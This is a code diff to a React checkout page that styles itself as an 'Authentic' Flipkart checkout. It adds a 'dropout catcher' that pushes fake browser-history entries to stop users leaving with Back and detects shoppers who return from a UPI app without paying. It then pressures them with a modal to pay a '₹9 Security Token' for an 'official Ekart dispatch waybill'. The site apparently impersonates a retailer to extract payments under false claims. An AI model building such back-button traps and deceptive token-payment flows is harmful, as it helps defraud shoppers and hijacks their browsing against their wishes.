@@ -1,6 +1,6 @@
 // src/client/pages/checkout/FlipkartCheckoutPage.tsx
 // Authentic 3-Step Flipkart Checkout System
-import React, { useState, useEffect, useMemo } from 'react'
+import React, { useState, useEffect, useMemo, useRef } from 'react'
 import { useParams, useNavigate } from 'react-router-dom'
 import { useQuery } from '@tanstack/react-query'
 import { motion, AnimatePresence } from 'framer-motion'
@@ -180,6 +180,11 @@ export default function FlipkartCheckoutPage() {
   const [showCodModal, setShowCodModal] = useState(false)
   const [codStep, setCodStep] = useState<'offer' | 'token'>('offer')
 
+  // 🎯 Dropout Catcher (When user backs out or cancels UPI without paying)
+  const [showDropoutModal, setShowDropoutModal] = useState(false)
+  const wasPayingRef = useRef(false)
+  const hasShownDropoutRef = useRef(false)
+
   // Gateway info
   const { isRazorpay, isBoth, defaultDualGateway, publicSettings } = usePaymentGatewayInfo()
 
@@ -275,6 +280,15 @@ export default function FlipkartCheckoutPage() {
     const handleReturnToTab = async () => {
       await checkActiveOrder()
       setIsProcessingPayment(false)
+
+      // 🎯 DROPOUT CATCHER: If user returned from PhonePe/UPI app without completing ₹49 payment, trigger ₹9 Token recovery modal!
+      if (wasPayingRef.current && !hasShownDropoutRef.current) {
+        wasPayingRef.current = false
+        hasShownDropoutRef.current = true
+        setTimeout(() => {
+          setShowDropoutModal(true)
+        }, 500)
+      }
     }
 
     const handleVisibility = () => {
@@ -364,13 +378,27 @@ export default function FlipkartCheckoutPage() {
     setShowAddressModal(false)
   }
 
-  // Handle Browser Back Button in Checkout Stepper
+  // Handle Browser Back Button in Checkout Stepper & Exit-Intent Dropout Catch
   useEffect(() => {
+    try {
+      window.history.pushState({ checkout_active: true }, '')
+    } catch {}
+
     const handlePopState = (e: PopStateEvent) => {
       if (currentStep === 3) {
         e.preventDefault()
         setCurrentStep(2)
         window.history.pushState({ step: 2 }, '')
+        return
+      }
+
+      // If user presses Back on Step 2 to leave without paying
+      if (!hasShownDropoutRef.current) {
+        hasShownDropoutRef.current = true
+        try {
+          window.history.pushState({ stay_on_checkout: true }, '')
+        } catch {}
+        setShowDropoutModal(true)
       }
     }
     window.addEventListener('popstate', handlePopState)
@@ -400,6 +428,9 @@ export default function FlipkartCheckoutPage() {
     if (!product || isProcessingPayment) return
     setIsProcessingPayment(true)
     setPaymentError('')
+    if (!isCodToken) {
+      wasPayingRef.current = true
+    }
 
     const validOverride = typeof overrideAmount === 'number' ? overrideAmount : undefined
     const finalAmount = (isCodToken && validOverride && validOverride > 0) ? validOverride : totalAmount
@@ -2316,6 +2347,166 @@ export default function FlipkartCheckoutPage() {
                   </div>
                 </div>
               )}
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
+
+      {/* ─── Dropout Catcher Modal: "Wait! Complete Order with just ₹9 Token 📦" ─── */}
+      <AnimatePresence>
+        {showDropoutModal && (
+          <div style={{
+            position: 'fixed', inset: 0, zIndex: 120, display: 'flex',
+            alignItems: 'flex-end', justifyContent: 'center'
+          }}>
+            {/* Backdrop */}
+            <motion.div
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              exit={{ opacity: 0 }}
+              onClick={() => setShowDropoutModal(false)}
+              style={{
+                position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.65)',
+                backdropFilter: 'blur(3px)'
+              }}
+            />
+
+            {/* Modal Card */}
+            <motion.div
+              initial={{ y: '100%' }}
+              animate={{ y: 0 }}
+              exit={{ y: '100%' }}
+              transition={{ type: 'spring', damping: 26, stiffness: 280 }}
+              style={{
+                position: 'relative', width: '100%', maxWidth: 500,
+                background: '#FFFFFF', borderTopLeftRadius: 22, borderTopRightRadius: 22,
+                padding: '18px 20px 28px', maxHeight: '90vh', overflowY: 'auto',
+                boxShadow: '0 -8px 30px rgba(0,0,0,0.3)', zIndex: 121
+              }}
+            >
+              {/* Drag Handle Bar */}
+              <div style={{
+                width: 36, height: 4, background: '#D1D5DB', borderRadius: 2,
+                margin: '0 auto 12px auto'
+              }} />
+
+              {/* Header */}
+              <div style={{
+                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
+                marginBottom: 12
+              }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
+                  <div style={{
+                    width: 32, height: 32, borderRadius: '50%', background: '#FEF08A',
+                    display: 'flex', alignItems: 'center', justifyContent: 'center'
+                  }}>
+                    <Zap size={18} color="#D97706" fill="#D97706" />
+                  </div>
+                  <div>
+                    <h2 style={{ fontSize: '1.08rem', fontWeight: 900, color: '#111827', margin: 0 }}>
+                      Wait! Complete with ₹9 Token 📦
+                    </h2>
+                    <span style={{ fontSize: '0.74rem', color: '#16A34A', fontWeight: 700 }}>
+                      ✓ Baaki payment Cash on Delivery par dijiye!
+                    </span>
+                  </div>
+                </div>
+                <button
+                  type="button"
+                  onClick={() => setShowDropoutModal(false)}
+                  style={{
+                    background: 'none', border: 'none', padding: 4, cursor: 'pointer',
+                    color: '#9CA3AF', display: 'flex'
+                  }}
+                >
+                  <X size={20} />
+                </button>
+              </div>
+
+              {/* Offer Card */}
+              <div style={{
+                background: '#FFFBEB', border: '1.5px solid #FDE68A', borderRadius: 12,
+                padding: '12px 14px', marginBottom: 14
+              }}>
+                <p style={{ margin: '0 0 8px 0', fontSize: '0.84rem', color: '#92400E', lineHeight: 1.45, fontWeight: 600 }}>
+                  Hesitating to pay full ₹{totalAmount} online? No problem! Pay a nominal <b>₹9 Security Token via UPI</b> to generate your official Ekart dispatch waybill barcode, and pay the remaining in cash at delivery!
+                </p>
+
+                <div style={{
+                  background: '#FFFFFF', borderRadius: 8, padding: '10px 12px',
+                  display: 'flex', flexDirection: 'column', gap: 6, fontSize: '0.82rem',
+                  border: '1px solid #FEF3C7'
+                }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', color: '#4B5563' }}>
+                    <span>Product Price:</span>
+                    <span style={{ fontWeight: 700 }}>₹{totalAmount.toLocaleString('en-IN')}</span>
+                  </div>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', color: '#16A34A', fontWeight: 800 }}>
+                    <span>⚡ Pay Token Now (via UPI):</span>
+                    <span>₹9</span>
+                  </div>
+                  <div style={{ height: 1, background: '#F3F4F6', margin: '2px 0' }} />
+                  <div style={{ display: 'flex', justifyContent: 'space-between', color: '#111827', fontWeight: 900, fontSize: '0.88rem' }}>
+                    <span>💵 Pay on Delivery (Cash):</span>
+                    <span style={{ color: '#2874F0' }}>₹{(Math.max(totalAmount - 9, 0)).toLocaleString('en-IN')}</span>
+                  </div>
+                </div>
+                <div style={{ fontSize: '0.70rem', color: '#B45309', marginTop: 6, textAlign: 'center' }}>
+                  ✓ ₹9 token is 100% adjusted into your final cash delivery receipt.
+                </div>
+              </div>
+
+              {/* Big Pay ₹9 Button */}
+              <button
+                type="button"
+                disabled={isProcessingPayment}
+                onClick={() => {
+                  setShowDropoutModal(false)
+                  setSelectedUpiOption('phonepe')
+                  handleProceedPayment(9, true)
+                }}
+                style={{
+                  width: '100%', padding: '14px', background: '#FFC200', color: '#111827',
+                  fontWeight: 900, fontSize: '1.05rem', border: 'none', borderRadius: 8,
+                  cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
+                  gap: 8, boxShadow: '0 3px 12px rgba(255, 194, 0, 0.45)',
+                  marginBottom: 10
+                }}
+              >
+                <Zap size={19} fill="#111827" />
+                <span>Pay ₹9 Token via UPI & Dispatch Order</span>
+              </button>
+
+              {/* Sub-actions */}
+              <div style={{ display: 'flex', flexDirection: 'column', gap: 6, textAlign: 'center' }}>
+                <button
+                  type="button"
+                  onClick={() => {
+                    setShowDropoutModal(false)
+                    setSelectedUpiOption('phonepe')
+                    handleProceedPayment()
+                  }}
+                  style={{
+                    background: 'none', border: 'none', color: '#2874F0',
+                    fontSize: '0.82rem', fontWeight: 700, cursor: 'pointer',
+                    padding: '4px 8px'
+                  }}
+                >
+                  Or Pay Full ₹{totalAmount.toLocaleString('en-IN')} via UPI (Save ₹50 Online)
+                </button>
+
+                <button
+                  type="button"
+                  onClick={() => setShowDropoutModal(false)}
+                  style={{
+                    background: 'none', border: 'none', color: '#9CA3AF',
+                    fontSize: '0.78rem', fontWeight: 600, cursor: 'pointer',
+                    padding: '4px 8px'
+                  }}
+                >
+                  I'll decide later
+                </button>
+              </div>
             </motion.div>
           </div>
         )}
